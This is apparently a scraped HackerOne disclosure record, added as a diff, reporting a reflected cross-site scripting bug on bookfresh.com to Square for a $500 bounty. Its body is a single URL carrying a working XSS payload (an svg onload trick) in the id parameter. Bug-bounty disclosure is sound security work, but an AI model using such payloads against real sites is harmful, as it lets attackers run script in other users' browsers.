@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/26527
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/banned
+ReportedTo:Square(square)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:17.11.2014 14:30:49
+
+Summary:
+
+Here is another reflected XSS.
+
+[https://www.bookfresh.com/index.html?view=past_activity&id=gwapo"><svg/onload=window.onerror=alert;throw/XSS/;//](https://www.bookfresh.com/index.html?view=past_activity&id=gwapo"><svg/onload=window.onerror=alert;throw/XSS/;//)
+
+Kindly have a look sir.
+
+Clifford
